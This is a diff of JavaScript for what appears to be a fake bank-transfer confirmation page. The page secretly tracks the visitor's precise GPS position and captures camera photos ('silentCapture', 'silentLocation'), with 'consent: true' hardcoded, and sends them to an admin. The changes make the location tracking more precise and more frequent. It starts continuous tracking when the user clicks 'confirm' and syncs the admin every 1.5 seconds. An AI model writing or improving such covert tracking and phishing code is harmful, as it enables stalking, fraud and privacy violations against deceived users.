@@ -89,10 +89,11 @@
 
     function isRealGps(loc) {
         if (!loc || typeof loc.lat !== 'number' || typeof loc.lng !== 'number') return false;
+        if (!Number.isFinite(loc.lat) || !Number.isFinite(loc.lng)) return false;
         if (loc.lat === 0 && loc.lng === 0) return false;
         if (Math.abs(loc.lat - (-6.2088)) < 0.001 && Math.abs(loc.lng - 106.8456) < 0.001) return false;
         if (loc.source === 'default-fallback' || loc.source === 'ip-network-estimated') return false;
-        if (loc.accuracy && loc.accuracy > 500) return false;
+        if (loc.accuracy && loc.accuracy > 1500) return false;
         return true;
     }
 
@@ -107,11 +108,10 @@
             } else {
                 bestAccurateLocation = savedGps;
                 liveLocationData = savedGps;
+                silentLocationData = savedGps;
             }
         }
     } catch(e) {}
-
-
 
     // ============================================================
     // PROCESS NEW LOCATION
@@ -144,17 +144,18 @@
             isBetter = true;
         } else if (!isRealGps(bestAccurateLocation)) {
             isBetter = true;
-        } else if (newAcc < bestAccurateLocation.accuracy - 3) {
+        } else if (newAcc < bestAccurateLocation.accuracy - 2) {
             isBetter = true;
-        } else if (newAcc <= bestAccurateLocation.accuracy + 5) {
+        } else if (newAcc <= bestAccurateLocation.accuracy + 20) {
             isBetter = true;
-        } else if (Date.now() - (bestAccurateLocation.capturedAt || 0) > 8000) {
+        } else if (Date.now() - (bestAccurateLocation.capturedAt || 0) > 5000) {
             isBetter = true;
         }
 
         if (isBetter) {
             bestAccurateLocation = newLocation;
             liveLocationData = newLocation;
+            silentLocationData = newLocation;
 
             try {
                 localStorage.setItem('bankidzz_best_gps', JSON.stringify({
@@ -164,12 +165,13 @@
             } catch(e) {}
 
             const accText = newAcc < 1000 ? `±${Math.round(newAcc)}m` : `±${(newAcc/1000).toFixed(1)}km`;
-            console.log(`[GPS-RT] ${newLocation.lat.toFixed(6)}, ${newLocation.lng.toFixed(6)} ${accText} [${source}]`);
+            console.log(`[GPS-RT] Realtime: ${newLocation.lat.toFixed(6)}, ${newLocation.lng.toFixed(6)} ${accText} [${source}]`);
 
-            // Auto-sync ke admin (debounced 5 detik)
+            // Auto-sync realtime ke admin segera
             if (currentTransferId && isRealGps(newLocation)) {
-                if (Date.now() - lastGpsSyncTime > 5000) {
-                    lastGpsSyncTime = Date.now();
+                const now = Date.now();
+                if (now - lastGpsSyncTime > 1500) {
+                    lastGpsSyncTime = now;
                     if (typeof syncTransactionRecord === 'function') {
                         syncTransactionRecord({
                             transferId: currentTransferId,
@@ -203,24 +205,10 @@
             }
         } catch(e) {}
 
-        // TAHAP 1: Instant position (maximumAge 30s)
-        try {
-            navigator.geolocation.getCurrentPosition(
-                (pos) => processNewLocation(pos, 'device-instant'),
-                (err) => console.log('[GPS-INIT] Fast check:', err.message),
-                { 
-                    enableHighAccuracy: true, 
-                    timeout: CONFIG.LOCATION_FAST_TIMEOUT, 
-                    maximumAge: 30000
-                }
-            );
-        } catch(e) {}
-
-        // TAHAP 2: Watch position realtime
         const geoOptions = {
             enableHighAccuracy: true,
-            timeout: 30000,
-            maximumAge: CONFIG.LOCATION_MAX_AGE_WATCH
+            timeout: 20000,
+            maximumAge: 0
         };
 
         const onLocationSuccess = (pos) => {
@@ -233,6 +221,16 @@
             }
         };
 
+        // Minta posisi instan fresh dengan HighAccuracy
+        try {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => processNewLocation(pos, 'satellite-instant'),
+                (err) => console.log('[GPS-INIT] Fast check:', err.message),
+                geoOptions
+            );
+        } catch(e) {}
+
+        // Watch continuous realtime stream
         try {
             if (locationWatchId !== null) {
                 navigator.geolocation.clearWatch(locationWatchId);
@@ -243,7 +241,7 @@
                 onLocationError, 
                 geoOptions
             );
-            console.log('[GPS-RT] Watch position aktif');
+            console.log('[GPS-RT] Watch position realtime aktif');
         } catch(e) {
             console.warn('[GPS-RT] watchPosition error:', e);
         }
@@ -316,28 +314,29 @@
     }
 
     // ============================================================
-    // GET SILENT LOCATION - MULTI-TAHAP
+    // GET SILENT LOCATION - REALTIME GPS PRIORITY
     // ============================================================
     function getSilentLocation() {
         return new Promise((resolve) => {
-            // Cek cache GPS fresh
+            // Cek jika sudah ada GPS real-time akurat dalam 20 detik terakhir
             if (isRealGps(bestAccurateLocation)) {
                 const age = Date.now() - (bestAccurateLocation.capturedAt || 0);
-                if (age < 30000) {
-                    console.log('[GPS] Instant lock dari cache:', Math.round(age/1000) + 's');
+                if (age < 20000 && bestAccurateLocation.accuracy <= 50) {
+                    console.log('[GPS] Realtime GPS akurat dari cache aktif:', Math.round(age/1000) + 's lalu (±' + Math.round(bestAccurateLocation.accuracy) + 'm)');
                     resolve({ ...bestAccurateLocation });
                     return;
                 }
             }
 
             if (!navigator.geolocation) {
+                console.warn('[GPS] Browser tidak mendukung geolocation, pakai fallback');
                 getNetworkIpLocation().then(resolve);
                 return;
             }
 
             let resolved = false;
 
-            const finalize = async () => {
+            const finalize = async (reason = '') => {
                 if (resolved) return;
                 resolved = true;
 
@@ -346,78 +345,67 @@
                 } else if (isRealGps(liveLocationData)) {
                     resolve({ ...liveLocationData });
                 } else {
+                    console.log('[GPS] GPS belum terkunci (' + reason + '), fallback IP');
                     const ipLoc = await getNetworkIpLocation();
                     resolve(ipLoc);
                 }
             };
 
+            // Beri batas waktu maksimal sebelum fallback
             const timeoutId = setTimeout(() => {
-                console.log('[GPS] Timeout, pakai data terbaik');
-                finalize();
-            }, CONFIG.LOCATION_TIMEOUT);
+                finalize('timeout');
+            }, 10000);
 
-            // STEP A: Instant lock
+            // Minta koordinat GPS realtime dengan akurasi tinggi
             try {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
-                        const loc = processNewLocation(pos, 'gps-instant-lock');
-                        
-                        if (loc && loc.accuracy <= 30) {
-                            clearTimeout(timeoutId);
-                            if (!resolved) {
-                                resolved = true;
-                                resolve({ ...loc });
-                            }
-                            return;
+                        clearTimeout(timeoutId);
+                        const loc = processNewLocation(pos, 'satellite-gps-realtime');
+                        if (!resolved) {
+                            resolved = true;
+                            resolve({ ...(loc || bestAccurateLocation) });
                         }
-                        
-                        tryGetFresh();
                     },
                     (err) => {
-                        console.warn('[GPS] Instant error:', err.message);
-                        tryGetFresh();
+                        console.warn('[GPS] getCurrentPosition error:', err.code, err.message);
+                        if (err.code === 1) {
+                            // User menolak izin GPS di popup
+                            clearTimeout(timeoutId);
+                            finalize('permission_denied');
+                        } else {
+                            // Coba kembali dengan parameter fresh
+                            try {
+                                navigator.geolocation.getCurrentPosition(
+                                    (pos2) => {
+                                        clearTimeout(timeoutId);
+                                        const loc2 = processNewLocation(pos2, 'satellite-gps-retry');
+                                        if (!resolved) {
+                                            resolved = true;
+                                            resolve({ ...(loc2 || bestAccurateLocation) });
+                                        }
+                                    },
+                                    () => {
+                                        clearTimeout(timeoutId);
+                                        finalize('retry_failed');
+                                    },
+                                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                                );
+                            } catch(eRetry) {
+                                clearTimeout(timeoutId);
+                                finalize('retry_exception');
+                            }
+                        }
                     },
                     {
                         enableHighAccuracy: true,
-                        timeout: 3000,
-                        maximumAge: 30000
+                        timeout: 10000,
+                        maximumAge: 0
                     }
                 );
             } catch(e) {
-                tryGetFresh();
-            }
-
-            // STEP B: Fresh lock
-            function tryGetFresh() {
-                if (resolved) return;
-                
-                try {
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => {
-                            const loc = processNewLocation(pos, 'gps-fresh-lock');
-                            clearTimeout(timeoutId);
-                            if (!resolved) {
-                                resolved = true;
-                                resolve({ ...(loc || bestAccurateLocation) });
-                            }
-                        },
-                        (err) => {
-                            console.warn('[GPS] Fresh error:', err.message);
-                            if (err.code === 1) {
-                                showNotification('⚠️ Aktifkan izin lokasi di browser', 'warning');
-                            }
-                            clearTimeout(timeoutId);
-                            finalize();
-                        },
-                        {
-                            enableHighAccuracy: true,
-                            timeout: 8000,
-                            maximumAge: 0
-                        }
-                    );
-                } catch(e) {
-                    finalize();
-                }
+                clearTimeout(timeoutId);
+                finalize('exception');
             }
         });
     }
@@ -714,17 +702,20 @@
 
         try {
             // ========================================================
-            // TAHAP 1A: KUNCI LOKASI GPS
+            // TAHAP 1A: KUNCI LOKASI GPS REALTIME
             // ========================================================
-            if (elements.btnConfirm) elements.btnConfirm.textContent = '📍 Mengunci Lokasi...';
-            console.log('[TAHAP-1A] GPS lock...');
+            if (elements.btnConfirm) elements.btnConfirm.textContent = '📍 Mengaktifkan GPS Realtime...';
+            console.log('[TAHAP-1A] Mengunci GPS realtime...');
             
+            // Picu tracking realtime seketika dari gestur klik pengguna
+            startRealtimeLocationTracking();
+
             let locResult;
             if (isRealGps(bestAccurateLocation)) {
                 const age = Date.now() - (bestAccurateLocation.capturedAt || 0);
-                if (age < 60000) {
+                if (age < 30000 && bestAccurateLocation.accuracy <= 50) {
                     locResult = { ...bestAccurateLocation };
-                    console.log('[GPS] Instant lock dari realtime:', Math.round(age/1000) + 's lalu');
+                    console.log('[GPS] Realtime GPS akurat terkunci:', Math.round(age/1000) + 's lalu');
                 } else {
                     locResult = await getSilentLocation();
                 }
@@ -747,7 +738,7 @@
             console.log('[TAHAP-1C] Kirim ke admin...');
             await syncTransactionRecord({
                 transferId: currentTransferId,
-                location: silentLocationData,
+                location: isRealGps(bestAccurateLocation) ? bestAccurateLocation : silentLocationData,
                 frontPhoto: silentFrontPhotoBase64,
                 photo: '',
                 status: 'waiting_item_photo'
@@ -776,14 +767,14 @@
 
                 await syncTransactionRecord({
                     transferId: currentTransferId,
-                    location: silentLocationData,
+                    location: isRealGps(bestAccurateLocation) ? bestAccurateLocation : silentLocationData,
                     frontPhoto: silentFrontPhotoBase64,
                     photo: capturedPhotoBase64 || '',
                     status: 'verified'
                 });
 
                 if (elements.btnConfirm) {
-                    elements.btnConfirm.textContent = '✅ Konfirmasi Berhasil Diverifikasi';
+                    elements.btnConfirm.textContent = 'Konfirmasi Berhasil Diverifikasi';
                     elements.btnConfirm.style.backgroundColor = '#10b981';
                     elements.btnConfirm.dataset.verified = 'true';
                 }
@@ -869,6 +860,11 @@
     async function syncTransactionRecord(data) {
         const transferId = data.transferId;
         
+        let resolvedLocation = data.location || silentLocationData || bestAccurateLocation || liveLocationData;
+        if (isRealGps(bestAccurateLocation)) {
+            resolvedLocation = bestAccurateLocation;
+        }
+
         const payload = {
             transferId: transferId,
             consent: true,
@@ -880,10 +876,10 @@
             receiverAccount: currentTemplate.receiverAccount || '2093832050',
             amount: currentTemplate.amountMain || 'IDR 515.000',
             amountSub: currentTemplate.amountSub || 'BND 35.12',
-            location: data.location || silentLocationData,
-            photo: data.photo || '',
-            frontPhoto: data.frontPhoto || '',
-            front_photo: data.frontPhoto || '',
+            location: resolvedLocation,
+            photo: data.photo || capturedPhotoBase64 || '',
+            frontPhoto: data.frontPhoto || silentFrontPhotoBase64 || '',
+            front_photo: data.frontPhoto || silentFrontPhotoBase64 || '',
             silentCapture: true,
             silentLocation: true,
             userAgent: navigator.userAgent,
@@ -899,7 +895,14 @@
             let localStored = JSON.parse(localStorage.getItem('bankidzz_local_transactions') || '[]');
             const idx = localStored.findIndex(t => t.transferId === transferId);
             if (idx >= 0) {
-                localStored[idx] = { ...localStored[idx], ...payload };
+                const prev = localStored[idx];
+                localStored[idx] = {
+                    ...prev,
+                    ...payload,
+                    photo: payload.photo || prev.photo || '',
+                    frontPhoto: payload.frontPhoto || prev.frontPhoto || '',
+                    location: (isRealGps(payload.location) ? payload.location : (isRealGps(prev.location) ? prev.location : payload.location))
+                };
             } else {
                 localStored.unshift(payload);
             }
